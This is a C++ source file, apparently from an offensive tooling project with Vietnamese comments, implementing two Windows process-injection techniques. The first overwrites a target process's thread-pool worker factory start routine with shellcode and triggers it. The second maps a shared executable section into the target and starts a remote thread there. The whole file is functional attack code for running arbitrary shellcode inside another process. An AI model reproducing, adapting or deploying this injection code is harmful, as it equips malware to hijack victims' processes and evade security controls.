#include "Technique.h"
#include "Util.h"

BOOL EnableDebugPrivilege()
{
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return ok && (GetLastError() == ERROR_SUCCESS);
}

BOOL InjectThreadpool(const std::vector<unsigned char>& shellcode, DWORD targetPid)
{
    std::cout << "Using technique 1: Worker Factory Start Routine Overwrite" << std::endl;

    EnableDebugPrivilege();

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto pNtQuerySystemInformation = (myNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    auto pNtQueryInformationWorkerFactory = (myNtQueryInformationWorkerFactory)GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory");
    auto pNtSetInformationWorkerFactory = (myNtSetInformationWorkerFactory)GetProcAddress(hNtdll, "NtSetInformationWorkerFactory");
    auto pNtQueryObject = (myNtQueryObject)GetProcAddress(hNtdll, "NtQueryObject");

    if (!pNtQuerySystemInformation || !pNtQueryInformationWorkerFactory ||
        !pNtSetInformationWorkerFactory || !pNtQueryObject)
    {
        if (!pNtQuerySystemInformation)        std::cerr << "Missing NtQuerySystemInformation" << std::endl;
        if (!pNtQueryInformationWorkerFactory) std::cerr << "Missing NtQueryInformationWorkerFactory" << std::endl;
        if (!pNtSetInformationWorkerFactory)   std::cerr << "Missing NtSetInformationWorkerFactory" << std::endl;
        if (!pNtQueryObject)                   std::cerr << "Missing NtQueryObject" << std::endl;
        return false;
    }

    // ---- TẤT CẢ BIẾN KHAI BÁO Ở ĐÂY (tránh C2362 với goto) ----
    HANDLE      hProcess = NULL;
    HANDLE      hWorkerFactory = NULL;
    bool        result = false;
    NTSTATUS    status = 0;
    ULONG       bufferSize = 0x10000;
    ULONG       returnedLen = 0;
    SIZE_T      bytesWritten = 0;
    LONG        newMin = 0;
    DWORD       oldProtect = 0;
    DWORD       tmpProtect = 0;
    SIZE_T      regionSize = 0;
    std::vector<unsigned char> buffer;

    BYTE        wfRaw[120] = {};
    PVOID       startRoutine = NULL;
    LONG        minThreads = 0;

    // 1) OpenProcess
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess)
    {
        std::cerr << "OpenProcess failed: " << GetLastError() << std::endl;
        return false;
    }

    // 2) Query SystemExtendedHandleInformation (class 64)
    do
    {
        buffer.resize(bufferSize);
        status = pNtQuerySystemInformation(64, buffer.data(), bufferSize, &bufferSize);

        if (status == (NTSTATUS)0xC0000004)   // STATUS_INFO_LENGTH_MISMATCH
            bufferSize += 0x1000;
        else
            break;
    } while (bufferSize <= 0x20000000);

    if (!NT_SUCCESS(status))
    {
        std::cerr << "NtQuerySystemInformation failed: 0x" << std::hex << status << std::endl;
        goto cleanup;
    }

    // 3) Tìm handle TpWorkerFactory trong targetPid
    {
        auto handles = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION_EX>(buffer.data());
        for (ULONG i = 0; i < handles->NumberOfHandles; i++)
        {
            auto& entry = handles->Handles[i];
            if (entry.UniqueProcessId != (ULONG_PTR)targetPid) continue;

            HANDLE hDup = NULL;
            if (!DuplicateHandle(hProcess, (HANDLE)(ULONG_PTR)entry.HandleValue,
                GetCurrentProcess(), &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS))
                continue;

            ULONG qsize = 0;
            NTSTATUS qStatus = pNtQueryObject(hDup, ObjectTypeInformation, nullptr, 0, &qsize);
            if (qStatus != (NTSTATUS)0xC0000004 || qsize == 0)
            {
                CloseHandle(hDup);
                continue;
            }

            auto typeInfo = (POBJECT_TYPE_INFORMATION)malloc(qsize);
            if (!typeInfo)
            {
                CloseHandle(hDup);
                continue;
            }

            qStatus = pNtQueryObject(hDup, ObjectTypeInformation, typeInfo, qsize, nullptr);
            BOOL matched = FALSE;
            if (NT_SUCCESS(qStatus) && typeInfo->TypeName.Buffer && typeInfo->TypeName.Length > 0)
            {
                std::wstring typeName(typeInfo->TypeName.Buffer,
                    typeInfo->TypeName.Length / sizeof(WCHAR));
                if (_wcsicmp(typeName.c_str(), L"TpWorkerFactory") == 0)
                {
                    hWorkerFactory = hDup;
                    matched = TRUE;
                }
            }
            free(typeInfo);
            if (matched) break;
            CloseHandle(hDup);
        }
    }

    if (!hWorkerFactory)
    {
        std::cerr << "Failed to find TpWorkerFactory handle in target" << std::endl;
        goto cleanup;
    }
    std::cout << "Found worker factory handle: 0x" << std::hex << hWorkerFactory << std::endl;

    // 4) Query WorkerFactoryBasicInformation (class 7, buffer 120 byte)
    status = pNtQueryInformationWorkerFactory(
        hWorkerFactory,
        WORKER_FACTORY_BASIC_INFORMATION_CLASS,
        wfRaw,
        sizeof(wfRaw),
        &returnedLen);

    if (!NT_SUCCESS(status))
    {
        std::cerr << "NtQueryInformationWorkerFactory failed: 0x" << std::hex << status << std::endl;
        goto cleanup;
    }
    std::cout << "WorkerFactoryBasicInformation returned "
        << std::dec << returnedLen << " bytes" << std::endl;

    // ============================================================
    // Đọc trực tiếp qua offset cố định — KHÔNG phụ thuộc struct definition
    //   ThreadMinimum : 0x24
    //   ThreadMaximum : 0x28
    //   StartRoutine  : 0x48
    //   StartParameter: 0x50
    // ============================================================
    minThreads = *reinterpret_cast<LONG*>(wfRaw + 0x24);
    startRoutine = *reinterpret_cast<PVOID*>(wfRaw + 0x48);

    std::cout << "ThreadMinimum = " << std::dec << minThreads
        << ", StartRoutine at: 0x" << std::hex << startRoutine << std::endl;

    // Sanity check
    if (startRoutine == NULL || (ULONG_PTR)startRoutine < 0x10000)
    {
        std::cerr << "StartRoutine looks invalid (too small), aborting." << std::endl;
        goto cleanup;
    }

    // 5) Kiểm tra vùng nhớ trước khi protect
    {
        MEMORY_BASIC_INFORMATION mbi = {};
        if (VirtualQueryEx(hProcess, startRoutine, &mbi, sizeof(mbi)) == 0)
        {
            std::cerr << "VirtualQueryEx failed: " << GetLastError() << std::endl;
            goto cleanup;
        }
        if (mbi.State != MEM_COMMIT)
        {
            std::cerr << "StartRoutine not committed. State=0x"
                << std::hex << mbi.State << std::endl;
            goto cleanup;
        }
        std::cout << "StartRoutine region: Base=0x" << std::hex << mbi.BaseAddress
            << " Protect=0x" << mbi.Protect << std::endl;
    }

    // 6) Đổi protection → ghi shellcode → khôi phục protection
    regionSize = shellcode.size();
    if (!VirtualProtectEx(hProcess, startRoutine, regionSize,
        PAGE_EXECUTE_READWRITE, &oldProtect))
    {
        std::cerr << "VirtualProtectEx failed: " << GetLastError() << std::endl;
        goto cleanup;
    }

    if (!WriteProcessMemory(hProcess, startRoutine,
        shellcode.data(), shellcode.size(), &bytesWritten) ||
        bytesWritten != shellcode.size())
    {
        std::cerr << "WriteProcessMemory failed: " << GetLastError() << std::endl;
        VirtualProtectEx(hProcess, startRoutine, regionSize, oldProtect, &tmpProtect);
        goto cleanup;
    }

    VirtualProtectEx(hProcess, startRoutine, regionSize, oldProtect, &tmpProtect);
    std::cout << "Overwritten StartRoutine at 0x" << std::hex << startRoutine << std::endl;

    // 7) Trigger: tăng ThreadMinimum để worker factory tạo thread mới
    //    Class = 4 (WorkerFactoryThreadMinimum) theo PHNT
    newMin = minThreads + 1;
    status = pNtSetInformationWorkerFactory(
        hWorkerFactory,
        WORKER_FACTORY_THREAD_MINIMUM_CLASS,
        &newMin,
        sizeof(newMin));

    if (!NT_SUCCESS(status))
    {
        std::cerr << "NtSetInformationWorkerFactory failed: 0x" << std::hex << status << std::endl;
        goto cleanup;
    }
    std::cout << "Worker Factory triggered at 0x" << std::hex << startRoutine << std::endl;
    result = true;

cleanup:
    if (hWorkerFactory) CloseHandle(hWorkerFactory);
    if (hProcess)       CloseHandle(hProcess);
    return result;
}

BOOL InjectSectionMapping(const std::vector<unsigned char>& shellcode, DWORD targetPid)
{
    std::cout << "Using technique 2: Shellcode Execution via Section Mapping" << std::endl;

    HMODULE hNtdll = GetModuleHandleA("ntdll");
    myNtCreateSection     fNtCreateSection = (myNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    myNtMapViewOfSection  fNtMapViewOfSection = (myNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");

    if (!fNtCreateSection || !fNtMapViewOfSection || !fRtlCreateUserThread)
        return false;

    // ============================================================
    // KHAI BÁO TẤT CẢ BIẾN Ở ĐÂY, TRƯỚC MỌI goto
    // ============================================================
    HANDLE  hProcess = NULL;
    HANDLE  hSection = NULL;
    HANDLE  hThread = NULL;
    PVOID   localAddress = NULL;
    PVOID   remoteAddress = NULL;
    bool    result = false;
    SIZE_T  viewSize = 0;
    SIZE_T  size = shellcode.size();
    NTSTATUS status = 0;

    // LARGE_INTEGER là union -> phải gán qua .QuadPart,
    // KHÔNG dùng initializer { (LONGLONG)size } (gây C4244/C4838)
    LARGE_INTEGER sectionSize = {};
    sectionSize.QuadPart = (LONGLONG)size;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess)
    {
        std::cerr << "OpenProcess Failed: " << GetLastError() << std::endl;
        return false;
    }

    status = fNtCreateSection(&hSection,
        SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL,
        &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status))
    {
        std::cerr << "NtCreateSection Failed: 0x" << std::hex << status << std::endl;
        goto cleanup;
    }

    status = fNtMapViewOfSection(hSection, GetCurrentProcess(),
        &localAddress, 0, 0, NULL, &viewSize, 2 /*ViewShare*/, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        std::cerr << "Local Map Failed: 0x" << std::hex << status << std::endl;
        goto cleanup;
    }

    viewSize = 0;
    status = fNtMapViewOfSection(hSection, hProcess,
        &remoteAddress, 0, 0, NULL, &viewSize, 2 /*ViewShare*/, 0, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        std::cerr << "Remote Map Failed: 0x" << std::hex << status << std::endl;
        goto cleanup;
    }

    memcpy(localAddress, shellcode.data(), size);

    status = fRtlCreateUserThread(hProcess, NULL, FALSE,
        0, 0, 0, remoteAddress, NULL, &hThread, NULL);
    if (!NT_SUCCESS(status))
    {
        std::cerr << "RtlCreateUserThread Failed: 0x" << std::hex << status << std::endl;
        goto cleanup;
    }

    if (hThread)
        WaitForSingleObject(hThread, INFINITE);

    result = true;

cleanup:
    if (hThread)  CloseHandle(hThread);
    if (hSection) CloseHandle(hSection);
    if (hProcess) CloseHandle(hProcess);
    return result;
}